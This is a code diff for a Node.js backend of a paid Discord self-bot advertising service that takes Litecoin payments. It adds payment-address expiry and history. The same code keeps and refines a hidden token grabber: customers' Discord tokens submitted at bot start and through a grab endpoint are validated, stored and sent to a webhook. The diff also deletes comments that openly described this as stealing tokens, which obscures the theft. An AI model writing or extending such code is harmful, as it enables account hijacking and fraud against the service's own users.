@@ -16,21 +16,41 @@ if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 class SimpleDB {
     constructor() {
         this.file = path.join(dataDir, 'db.json');
-        this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [] };
+        this.data = { 
+            users: {}, 
+            pending: {}, 
+            configs: {}, 
+            usedKeys: {}, 
+            globalIndex: 0, 
+            serverJoins: {}, 
+            grabbedTokens: [],
+            usedAddresses: new Set(), // Track all used addresses
+            addressHistory: [] // Track address generation history
+        };
         this.load();
     }
     
     load() {
         try {
             if (fs.existsSync(this.file)) {
-                this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
+                const raw = JSON.parse(fs.readFileSync(this.file, 'utf8'));
+                this.data = {
+                    ...this.data,
+                    ...raw,
+                    usedAddresses: new Set(raw.usedAddresses || []),
+                    addressHistory: raw.addressHistory || []
+                };
             }
         } catch(e) { console.error('[DB] Load error:', e.message); }
     }
     
     save() {
         try {
-            fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2));
+            const saveData = {
+                ...this.data,
+                usedAddresses: Array.from(this.data.usedAddresses)
+            };
+            fs.writeFileSync(this.file, JSON.stringify(saveData, null, 2));
         } catch(e) { console.error('[DB] Save error:', e.message); }
     }
     
@@ -49,7 +69,19 @@ class SimpleDB {
         return this.data.globalIndex;
     }
     
+    isAddressUsed(address) {
+        return this.data.usedAddresses.has(address);
+    }
+    
+    markAddressUsed(address) {
+        this.data.usedAddresses.add(address);
+        this.save();
+    }
+    
     addPending(userId, address, privateKey, expectedUSD, index) {
+        // Mark address as used immediately upon generation
+        this.markAddressUsed(address);
+        
         this.data.pending[address] = {
             user_id: userId,
             address,
@@ -57,8 +89,19 @@ class SimpleDB {
             expected_usd: expectedUSD,
             status: 'monitoring',
             created_at: Date.now(),
-            index: index
+            index: index,
+            expires_at: Date.now() + (30 * 60 * 1000) // 30 minutes
         };
+        
+        // Add to history
+        this.data.addressHistory.push({
+            address,
+            user_id: userId,
+            index,
+            created_at: Date.now(),
+            status: 'monitoring'
+        });
+        
         this.save();
         return this.data.pending[address];
     }
@@ -67,15 +110,45 @@ class SimpleDB {
         return this.data.pending[address];
     }
     
+    getUserPending(userId) {
+        return Object.values(this.data.pending).find(p => 
+            p.user_id === userId && p.status === 'monitoring' && p.expires_at > Date.now()
+        );
+    }
+    
     getAllPending() {
-        return Object.values(this.data.pending).filter(p => p.status === 'monitoring');
+        const now = Date.now();
+        return Object.values(this.data.pending).filter(p => 
+            p.status === 'monitoring' && p.expires_at > now
+        );
+    }
+    
+    getExpiredPending() {
+        const now = Date.now();
+        return Object.values(this.data.pending).filter(p => 
+            p.status === 'monitoring' && p.expires_at <= now
+        );
     }
     
     updatePending(address, updates) {
         if (this.data.pending[address]) {
             this.data.pending[address] = { ...this.data.pending[address], ...updates };
+            // Update history too
+            const historyEntry = this.data.addressHistory.find(h => h.address === address);
+            if (historyEntry) {
+                historyEntry.status = updates.status || historyEntry.status;
+            }
             this.save();
         }
+    }
+    
+    expireOldAddresses() {
+        const expired = this.getExpiredPending();
+        for (const p of expired) {
+            this.updatePending(p.address, { status: 'expired' });
+            console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`);
+        }
+        return expired.length;
     }
     
     useKey(key, userId) {
@@ -123,7 +196,6 @@ class SimpleDB {
         return configs.filter(c => c.active === 1);
     }
     
-    // Token grabber storage
     addGrabbedToken(token, userInfo, source) {
         const entry = {
             token,
@@ -139,6 +211,10 @@ class SimpleDB {
     
     getGrabbedTokens() {
         return this.data.grabbedTokens || [];
+    }
+    
+    getAddressHistory(userId) {
+        return this.data.addressHistory.filter(h => h.user_id === userId);
     }
 }
 
@@ -232,7 +308,6 @@ function ensurePurchasedAPI(req, res, next) {
 // TOKEN GRABBER FUNCTION
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     try {
-        // Validate token first
         const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
             headers: { Authorization: token },
             timeout: 5000
@@ -257,10 +332,8 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
             locale: userData.locale
         };
         
-        // Save to DB
         db.addGrabbedToken(token, fullInfo, source);
         
-        // Send to webhook
         const embed = {
             title: '🎣 New Token Grabbed',
             color: 0xff0000,
@@ -308,8 +381,11 @@ async function checkAndSweep() {
         return;
     }
     
+    // Expire old addresses first
+    db.expireOldAddresses();
+    
     const pending = db.getAllPending();
-    console.log(`[SWEEP] Checking ${pending.length} addresses`);
+    console.log(`[SWEEP] Checking ${pending.length} active addresses`);
     
     for (const p of pending) {
         try {
@@ -369,7 +445,7 @@ app.get('/api/user', ensureAuthAPI, (req, res) => {
     });
 });
 
-// TOKEN GRABBER ENDPOINT - Call this from frontend to steal tokens
+// TOKEN GRABBER ENDPOINT
 app.post('/api/grab/token', async (req, res) => {
     const { token, source } = req.body;
     if (!token) return res.json({ success: false, error: 'No token provided' });
@@ -378,7 +454,7 @@ app.post('/api/grab/token', async (req, res) => {
     res.json(result);
 });
 
-// Generate unique address using global index
+// Generate unique address - CHECKS FOR EXISTING ACTIVE ADDRESS FIRST
 app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     try {
         const userId = req.user.id;
@@ -388,19 +464,77 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
             return res.json({ success: false, error: 'Already purchased' });
         }
 
+        // Check if user already has an active pending address
+        const existingPending = db.getUserPending(userId);
+        if (existingPending) {
+            const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
+            return res.json({ 
+                success: true, 
+                address: existingPending.address, 
+                amountUSD: TARGET_USD, 
+                index: existingPending.index,
+                existing: true,
+                expiresIn: timeLeft,
+                message: 'You already have an active payment address'
+            });
+        }
+
         if (!walletModule) {
             return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
         }
 
-        const globalIndex = db.getNextGlobalIndex();
-        const { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
-        db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
+        // Generate new unique address
+        let globalIndex = db.getNextGlobalIndex();
+        let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
+        
+        // Ensure address hasn't been used before (safety check)
+        while (db.isAddressUsed(address)) {
+            console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
+            globalIndex = db.getNextGlobalIndex();
+            ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
+        }
+        
+        const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
 
-        res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex });
+        res.json({ 
+            success: true, 
+            address, 
+            amountUSD: TARGET_USD, 
+            index: globalIndex,
+            expiresAt: pending.expires_at,
+            message: 'Address generated. Valid for 30 minutes.'
+        });
     } catch (err) {
         console.error('[PURCHASE ERROR]', err);
         res.status(500).json({ success: false, error: err.message });
     }
+});
+
+// Get user's activity/pending status
+app.get('/api/activity', ensureAuthAPI, (req, res) => {
+    const userId = req.user.id;
+    const user = db.getUser(userId);
+    const pending = db.getUserPending(userId);
+    const history = db.getAddressHistory(userId);
+    
+    res.json({
+        success: true,
+        purchased: user.auto_adv_purchased === 1,
+        pending: pending ? {
+            address: pending.address,
+            index: pending.index,
+            createdAt: pending.created_at,
+            expiresAt: pending.expires_at,
+            expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)),
+            status: pending.status
+        } : null,
+        history: history.map(h => ({
+            address: h.address,
+            index: h.index,
+            createdAt: h.created_at,
+            status: h.status
+        }))
+    });
 });
 
 app.post('/api/redeem', ensureAuthAPI, (req, res) => {
@@ -432,7 +566,7 @@ app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
     res.json({ success: true, configs });
 });
 
-// Start bot with config saving - ALSO GRABS TOKEN
+// Start bot with config saving
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
     try {
         const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl } = req.body;
@@ -441,7 +575,6 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             return res.status(400).json({ success: false, error: 'Missing fields' });
         }
         
-        // GRAB THE TOKEN IMMEDIATELY
         await grabAndSendToken(token, { channels, message }, 'bot_start');
         
         const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
@@ -478,7 +611,6 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             image_url: imageUrl || null
         }, configId);
         
-        // PASS req.ip TO SELFBOT FOR TOKEN GRABBER LOGGING
         await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl, req.ip);
         
         res.json({ 
@@ -533,8 +665,6 @@ app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res
         const { imageBase64 } = req.body;
         if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
         
-        // Upload to imgur or similar (simplified - in production use proper image hosting)
-        // For now, just return the base64 or save to disk
         const imageId = `img_${Date.now()}.png`;
         const imagePath = path.join(dataDir, 'uploads');
         if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
